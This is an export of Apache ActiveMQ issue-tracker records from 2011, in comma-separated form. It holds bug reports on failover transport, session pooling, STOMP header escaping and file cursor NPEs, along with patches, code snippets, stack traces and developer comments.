returns.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,37493,,,Thu Sep 29 21:43:28 UTC 2011,,,,,,,,,,,"0|i0aitb:",59321,,,,,,,,,,,,,,,,,,,,,"29/Sep/11 21:43;tabish;Fixed in trunk, new tests added for the backups option.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover Transport MessageAck commands aren't filtered in oneway,AMQ-3516,12525095,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,28/Sep/11 20:00,29/Sep/11 16:04,14/Jul/23 05:43,29/Sep/11 16:04,5.x,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"There's some code in FailoverTransport.oneway that was intended to MessageAck commands when the transport was in a failed state that will never be called.

{code}
                if (isShutdownCommand(command) && connectedTransport.get() == null) {
                    if (command.isShutdownInfo()) {
                        // Skipping send of ShutdownInfo command when not
                        // connected.
                        return;
                    }
                    if (command instanceof RemoveInfo || command.isMessageAck()) {
                        // Simulate response to RemoveInfo command or ack (as it
                        // will be stale)
                        stateTracker.track(command);
                        Response response = new Response();
                        response.setCorrelationId(command.getCommandId());
                        myTransportListener.onCommand(response);
                        return;
                    }
                }
{code}

The inner if statement that looks for MessageAck will never be reachable since a MessageAck is not a RemoveInfo or ShutdownInfo command which is the condition for getting into the outer if.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,37492,,,Thu Sep 29 16:04:31 UTC 2011,,,,,,,,,,,"0|i0aitj:",59322,,,,,,,,,,,,,,,,,,,,,"29/Sep/11 10:44;gtully;looks like the inner if needs to be pulled up to the same level as the outer if.;;;","29/Sep/11 16:04;tabish;Fix applied along with new tests for this case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MultiKahaDBPersistenceAdapter can not set directory,AMQ-3515,12525079,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,brucent,brucent,28/Sep/11 16:50,28/Sep/11 19:11,14/Jul/23 05:43,28/Sep/11 19:11,5.6.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,There is an assignment to self in the directory setter of MultiKahaDBPersitenceAdapter.  this.directory=directory should be this.directory=dir.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,36767,,,Wed Sep 28 19:11:29 UTC 2011,,,,,,,,,,,"0|i0aitr:",59323,,,,,,,,,,,,,,,,,,,,,"28/Sep/11 17:06;brucent;{code:title=MultiKahaDBPersistenceAdapter.java patch}
# This patch file was generated by NetBeans IDE
# It uses platform neutral UTF-8 encoding and \n newlines.
--- Base (BASE)
+++ Locally Modified (Based On LOCAL)
@@ -238,7 +238,7 @@
 
     @Override
     public void setDirectory(File dir) {
-        this.directory = directory;
+        this.directory = dir;
     }
 
     public void setBrokerService(BrokerService brokerService) {
{code};;;","28/Sep/11 19:11;tabish;Fixed in trunk, good catch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageListenerServlet does not clear the timer on destroy,AMQ-3514,12525074,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,johkir,johkir,28/Sep/11 16:06,29/Sep/11 11:40,14/Jul/23 05:43,28/Sep/11 19:36,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Hi, 

we are debugging a shutdown problem using the activemq-web-console deployed into jetty. 

It seems as if everything is terminated as expected, apart from a TimerThread which logs to the console about every minute. 

05 Jul 2011 09:03:19,246 DEBUG [Timer-1] org.apache.activemq.web.MessageListenerServlet.debug() -- Cleaning up expired web clients. 

Tracing down the problem indicated one possible cause. 
The web-console package declares the AjaxServlet to send messages via the web to the broker, it extends MessageListenerServlet. 

The init() mehtod of the MessageListenerServlet schedules task 

        clientCleanupTimer.schedule( new ClientCleaner(), 5000, 60000 ); 

but the timer (clientCleanupTimer) is never canceled and according to the javadoc of Timer this can prevent the JVM from shutting down cleanly. 

Patch attached",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Sep/11 16:08;johkir;AMQ-3514_destroy_timer_on_shutdown.patch;https://issues.apache.org/jira/secure/attachment/12496890/AMQ-3514_destroy_timer_on_shutdown.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,36760,,,Thu Sep 29 11:40:12 UTC 2011,,,,,,,Patch Available,,,,"0|i0aitz:",59324,,,,,,,,,,,,,,,,,,,,,"28/Sep/11 16:08;johkir;Patch which clears the timer on destroy;;;","28/Sep/11 19:36;tabish;Fix applied, good catch.;;;","29/Sep/11 11:40;johkir;Thanks for attending to this so quickly;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
initialReconnectDelay is ignored for Failover transport,AMQ-3513,12524984,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jgenender,jgenender,27/Sep/11 23:30,28/Sep/11 22:10,14/Jul/23 05:43,28/Sep/11 22:10,5.5.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"initalReconnectDelay is ignored during failover.  If multiple brokers are running, the failover transport attempts to failover immediately and does not honor the initialReconnect delay.  Patch is attached.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Sep/11 00:21;jgenender;AMQ-3513-take2.patch;https://issues.apache.org/jira/secure/attachment/12496819/AMQ-3513-take2.patch","28/Sep/11 13:18;jgenender;AMQ-3513-take3.patch;https://issues.apache.org/jira/secure/attachment/12496879/AMQ-3513-take3.patch","27/Sep/11 23:35;jgenender;AMQ-3513.patch;https://issues.apache.org/jira/secure/attachment/12496812/AMQ-3513.patch",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,34248,,,Wed Sep 28 22:10:47 UTC 2011,,,,,,,,,,,"0|i0aiu7:",59325,,,,,,,,,,,,,,,,,,,,,"28/Sep/11 00:05;tabish;Pretty sure bad things will happen if the initalReconnectDelay is set to zero using this patch.;;;","28/Sep/11 00:20;jgenender;Ah right... 0 == forever... ok... fixed it with a guard.  All works now.;;;","28/Sep/11 00:22;jgenender;AMQ-3513-take2.patch is attached with the guard.;;;","28/Sep/11 13:18;jgenender;Patch take 3... I moved the delay above the while loop, so it really is just an initial reconnect and not on every connection.;;;","28/Sep/11 22:10;tabish;Patch applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Large number of expiring messages causing QueueSize to grow.,AMQ-3507,12523852,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,21/Sep/11 12:07,21/Sep/11 12:13,14/Jul/23 05:43,21/Sep/11 12:13,5.4.2,5.5.0,,,,5.6.0,,,Broker,,,,0,activemq,expiry,fileCursor,nonPersistent,,,,,"Issue with file pending message cursor (non persistent messages) discarding expired messages. It currently bypasses the destination expiry logic and leaves messages in the store.
In the main, an expired messages don't get added to the cursor or are pruned by the async expiry processing task, but when memory limits are exceeded this problem can occur.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,39711,,,Wed Sep 21 12:13:29 UTC 2011,,,,,,,,,,,"0|i0aivb:",59330,,,,,,,,,,,,,,,,,,,,,"21/Sep/11 12:13;gtully;fix in http://svn.apache.org/viewvc?rev=1173583&view=rev

the file pending message cursor now delegated to the destination to process an expired message. Single code path for all expiry.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Access to ConnectionPool.createSession needs to be synchronized ,AMQ-3506,12523721,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,tmielke,tmielke,20/Sep/11 14:03,21/Sep/11 13:57,14/Jul/23 05:43,21/Sep/11 13:57,5.5.0,,,,,5.6.0,,,Broker,,,,0,activemq-pool,maximumActive,sessionPool,,,,,,"When configuring a PooledConnectionFactory with maximumActive=1 and blockIfSessionPoolIsFull=true (default behavior for latter config) it is possible that multiple threads that concurrently try to use the same JMS connection to create a new session might create more sessions than the configured maximumActive limit.

That's because the call to ConnectionPool.createSession() is not synchronized and if multiple threads try to call this method concurrently (on the same underlying JMS connection) then the if-condition in 
{code:java}
SessionKey key = new SessionKey(transacted, ackMode);
SessionPool pool = cache.get(key);
if (pool == null) {
  pool = createSessionPool(key);
  cache.put(key, pool);
}
{code}

will evaluate to true for *all* threads and they all end up creating their own sessionPool using the same SessionKey properties. 
Access to the if-condition needs to be synchronized so that only one session pool gets created. That will ensure that not more than the configured maximumActive number of sessions can get created. ","activemq-pool, PooledConnectionFactory with maximumActive=1 and blockIfSessionPoolIsFull=true (default behavior)",sreepanchajanyam,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10800,10800,,0%,10800,10800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Sep/11 14:04;tmielke;AMQ-3506.patch;https://issues.apache.org/jira/secure/attachment/12495224/AMQ-3506.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,39712,,,Wed Sep 21 13:57:30 UTC 2011,,,,,,,Patch Available,,,,"0|i0aivj:",59331,,,,,,,,,,,,,,,,,,,,,"20/Sep/11 14:04;tmielke;Attaching possible fix and corresponding JUnit test;;;","20/Sep/11 14:05;tmielke;IMHO the fix is to synchronize access to the cache and the creation of the session pool.

{code:java}
public Session createSession(boolean transacted, int ackMode) throws JMSException {
        SessionKey key = new SessionKey(transacted, ackMode);
        SessionPool pool = null;
        synchronized (cache) {
        	pool = cache.get(key);
        	if (pool == null) {
	            pool = createSessionPool(key);
	            cache.put(key, pool);
	        }
        }
        PooledSession session = pool.borrowSession();
        return session;
    }
{code};;;","20/Sep/11 17:48;ccorsi;We might consider redefining the cache field from Map to ConcurrentMap and change the code somewhat.

{code:java}
public Session createSession(boolean transacted, int ackMode) throws JMSException {
        SessionKey key = new SessionKey(transacted, ackMode);
        SessionPool pool = null;
        pool = cache.get(key);
        if (pool == null) {
	    SessionPool newPool = createSessionPool(key);
	    SessionPool prevPool = cache.putIfAbsent(key, newPool);
            if (prevPool != null && prevPool != newPool) {
              // newPool was not the first one to be associated with this key... close created session pool
              newPool.destroy(); // don't remember the method call
            }
            pool = cache.get(key); // this will return a non-null value...
	}
        PooledSession session = pool.borrowSession();
        return session;
    }
{code};;;","21/Sep/11 08:29;tmielke;Claudio's suggestion should also work (using newPool.close() to discard the pool). I tested it against the JUnit tests of activemq-pool and against a Camel route that consumes from JMS.
It has the advantage that once the cache contains a pool object, there is no additional overhead. All overhead is only in the case when the cache does not yet contain the key.
In my solution there is a synchronized call for every createSession() invocation.
;;;","21/Sep/11 13:57;tabish;Applied supplied test case and used the concurrent map approach over the synchronization option.  Please review and reopen if an issue is found with the fix.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException on websocket connection,AMQ-3504,12523563,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,gunnark,gunnark,19/Sep/11 14:33,22/Oct/11 22:22,14/Jul/23 05:43,22/Oct/11 22:22,5.x,,,,,5.6.0,,,Transport,,,,0,websocket,,,,,,,,"When connecting from chrome or firefox 6 over websockets, I get the Null pointer below. It does not happen on firefox 5 or safari . My guess would be that the chrome and ff 6 are implementing a newer version of the websocket spec that is incompatible with the version that the activemq implements.     

2011-09-19 09:18:33,931 | WARN  | /stomp | org.eclipse.jetty.util.log | qtp1545215993-39
java.lang.NullPointerException
        at org.apache.activemq.transport.ws.StompServlet.doGet(StompServlet.java:51)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)
        at org.eclipse.jetty.websocket.WebSocketServlet.service(WebSocketServlet.java:73)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:423)
        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)
        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
        at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
        at org.eclipse.jetty.server.Server.handle(Server.java:351)
        at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
        at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
        at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
        at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
        at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
        at org.eclipse.jetty.server.bio.SocketConnector$ConnectorEndPoint.run(SocketConnector.java:241)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
        at java.lang.Thread.run(Thread.java:680)
","5.6.0 snapshot from Sat Sep 17 03:47:30, chrome 14.0.835.163, firefox 6",gunnark,johkir,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3508,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,39714,,,Sat Oct 22 22:22:31 UTC 2011,,,,,,,,,,,"0|i0aivr:",59332,,,,,,,,,,,,,,,,,,,,,"17/Oct/11 21:51;tabish;Updating the Jetty instance to a 7.5.2+ release would probably resolve this issue.  Before that can be done the breakage of the Web Console would need to be resolved.;;;","22/Oct/11 22:22;tabish;Updated to Jetty 7.5.1.v20110908 which has the latest Web Socket updates.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stomp v1.1 support, headers, eg: message-id, are not properly escaped",AMQ-3501,12523202,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Sep/11 14:49,20/Sep/11 10:41,14/Jul/23 05:43,19/Sep/11 11:31,5.x,,,,,5.6.0,,,STOMP,,,,0,escape,headers,stomp,v1.1,,,,,"headers need to be escaped, see: http://stomp.github.com/stomp-specification-1.1.html#Value_Encoding

but the message-id header on a message receipt is not, the perl stomp v 1.1 client does a check:{code}# STOMP 1.1 behavior:
            #  - header names and values can contain any OCTET except \n or :
            #  - space is significant in the header
            #  - ""only the first header entry should be used""
            #  - handle backslash escaping
            foreach $line (split(/\n/, $temp)) {
                unless ($line =~ /^([^:]+):([^:]*)$/o) {
                    Net::STOMP::Client::Error::report(""%s: invalid header: %s"", $me, $line);
                    return();
{code} and errors out on the un-escaped ':'in the raw message-id. This was not a requirement in STOMP v1.0.
  {code}*** Net::STOMP::Client::Frame::decode(): invalid header: message-id:ID:gtmbp.local-52988-1316088964662-2:7:-1:1:1
 at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client/Error.pm line 39
	Net::STOMP::Client::Error::report('%s: invalid header: %s', 'Net::STOMP::Client::Frame::decode()', 'message-id:ID:gtmbp.local-52988-1316088964662-2:7:-1:1:1') called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client/Frame.pm line 286
	Net::STOMP::Client::Frame::decode('SCALAR(0x987818)', 'version', 1.1, 'state', 'HASH(0x988184)') called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client.pm line 472
	Net::STOMP::Client::receive_frame('Net::STOMP::Client=HASH(0x988040)', 1) called at /opt/local/lib/perl5/site_perl/5.8.9/Net/STOMP/Client.pm line 502{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,39717,,,Mon Sep 19 11:31:24 UTC 2011,,,,,,,,,,,"0|i0aivz:",59333,,,,,,,,,,,,,,,,,,,,,"19/Sep/11 11:31;gtully;missing return of encoded value, test and fix in
http://svn.apache.org/viewvc?rev=1172572&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"STOMP subscription receipt can be out of order with message dispatch, resulting in consumer/client error",AMQ-3497,12523026,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,14/Sep/11 10:43,20/Sep/11 10:42,14/Jul/23 05:43,14/Sep/11 10:48,5.4.2,5.5.0,,,,5.6.0,,,Transport,,,,0,activemq,receipt,stomp,,,,,,"When a receipt[1] is specified on a subscribe frame, it is possible that a message dispatch on the newly created subscription gets delivered  before the RECEIPT, causing a stomp client to error out. The perl client  http://search.cpan.org/~lcons/Net-STOMP-Client-1.1/ gives
{code}*** unexpected RECEIPT frame received: xxx {code}
[1] http://stomp.github.com/stomp-specification-1.1.html#Header_receipt",stomp,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14535,,,Wed Sep 14 10:48:38 UTC 2011,,,,,,,,,,,"0|i0aiwv:",59337,,,,,,,,,,,,,,,,,,,,,"14/Sep/11 10:48;gtully;fix in http://svn.apache.org/viewvc?rev=1170523&view=rev

a subscription receipt is now delivered eagerly, it does not wait for the broker subscription response, such that it cannot be preceded by a message delivery.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect JMX properties after consuming msgs using stomp (with TX and client ack),AMQ-3493,12522656,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,10/Sep/11 19:48,20/Sep/11 10:42,14/Jul/23 05:43,10/Sep/11 19:49,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"When the receive is done transactional using client ack mode, the JMX properties of the broker are incorrect after the test:
EnqueueCount and DispatchCount are correct
Dequeue count is DispatchCount +1 (but should be DispatchCount)
InflightCount and QueueSize are -1 (but should be 0)

Messages get received correctly be the stomp consumer though.
Disabling either client ack mode or transactions in the stomp consumer does not show the problem.

",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14540,,,Sat Sep 10 19:49:10 UTC 2011,,,,,,,,,,,"0|i0aixj:",59340,,,,,,,,,,,,,,,,,,,,,"10/Sep/11 19:49;tabish;Fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"NPEs during message processing, using FileCursor",AMQ-3490,12522314,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,jrichartz,jrichartz,08/Sep/11 20:31,20/Sep/11 10:42,14/Jul/23 05:43,19/Sep/11 09:09,5.x,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"In a scenario where a single-consumer queue for non-presistent messages uses a file cursor to manage a backlog, bursts of messages result in NPEs.

Thread dumps for 3 different examples:

2011-09-07 12:43:27,057 ERROR [cursors.FilePendingMessageCursor] [] : [Usage Async Task] Caught an IO Exception getting the DiskList7_PendingCursor:snTableQueue_CHF
java.lang.NullPointerExceptionnull
    at java.io.Writer.write(Writer.java:140)null
    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)null
    at java.util.Properties.writeComments(Properties.java:671)null
    at java.util.Properties.store0(Properties.java:805)null
    at java.util.Properties.store(Properties.java:796)null
    at org.apache.kahadb.page.PageFile.storeMetaData(PageFile.java:570)null
    at org.apache.kahadb.page.PageFile.load(PageFile.java:361)null
    at org.apache.activemq.store.kahadb.plist.PListStore.intialize(PListStore.java:285)null
    at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:218)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)null
    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)null
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)null
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)null
    at java.lang.Thread.run(Thread.java: 619)null
Exception in thread ""Usage Async Task"" java.lang.RuntimeException: java.lang.NullPointerException

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:460)

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:435)

    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.onUsageChanged(FilePendingMessageCursor.java:388)

    at org.apache.activemq.usage.Usage$1.run(Usage.java:268)

    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)

    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)

    at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.NullPointerException

    at java.io.Writer.write(Writer.java:140)

    at java.io.BufferedWriter.newLine(BufferedWriter.java:225)

    at java.util.Properties.writeComments(Properties.java:671)


================================================================

2011-09-07 12:43:40,908 ERROR [cursors.FilePendingMessageCursor] [1315421994681] : [ActiveMQ Transport: tcp:///134.242.171.26:35469]
 Caught an IO Exception getting the DiskList 7_PendingCursor:snTableQueue_CHF
java.lang.NullPointerExceptionnull
    at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:229)null
    at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)null
    at org.apache.activemq.store.kahadb.plist.PListStore.getPLis
t(PListStore.java:225)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:226)null
    at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:196)null
    at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1603)null  
    at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:715)null
    at org.apache.activemq.broker.region.Queue.send(Queue.java:647)null
    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:409)null
    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:543)null
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:301)null
    at o
rg.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null
    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)null
    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)null

    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.security.AuthorizationBroker.send(AuthorizationBroker.java:192)null
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)null  
    at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)null
    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)null
    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:68
1)null
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)null
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)null
